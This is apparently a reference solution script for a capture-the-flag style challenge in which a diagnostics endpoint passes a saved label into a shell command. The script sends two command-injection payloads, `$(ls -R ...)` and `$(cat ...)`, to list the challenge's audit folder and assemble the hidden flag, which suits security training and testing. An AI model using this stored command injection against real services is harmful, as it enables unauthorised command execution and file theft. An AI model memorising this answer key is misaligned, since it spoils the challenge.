// Reference solve — Beacon, Inquisitor. The probe validates the host strictly and runs no shell, so the host is a
// dead end. The free-text label is trusted, though: /diagnostics stores it, and GET /diagnostics/report interpolates
// the most recent saved label into `sh -c 'echo "<label>" >> /tmp/beacon/report.txt'`. The flag now lives in a
// random pair under /tmp/beacon/audit/<random> (not /tmp/beacon/flag.txt): first save a label that lists the audit
// folder, then save a label that joins the pair belonging to one token. Only the flag is printed.
const base = process.argv[2];
const HOST = '192.168.1.1';

async function saveLabel(label) {
  await fetch(`${base}/diagnostics`, {
    method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ host: HOST, label }),
  });
}
async function report() {
  return (await fetch(`${base}/diagnostics/report`)).text();
}
const flagOf = (html) => /HVWA\{[a-z2-7]{26}\}/.exec(html)?.[0];

// Step one: the report generator runs `ls -R` over the audit store; its output is written into report.txt.
await saveLabel('$(ls -R /tmp/beacon/audit)');
const listing = await report();
const dir = /\/tmp\/beacon\/audit\/[a-f0-9]{8}/.exec(listing)?.[0];
if (!dir) process.exit(0);
const tokens = [...new Set([...listing.matchAll(/part-[12]-([a-f0-9]{8})/g)].map((m) => m[1]))];

// Step two: join a candidate pair and keep the only joined value that is a valid flag.
for (const token of tokens) {
  await saveLabel(`$(cat ${dir}/part-1-${token} ${dir}/part-2-${token})`);
  const m = flagOf(await report());
  if (m) { console.log(m); break; }
}
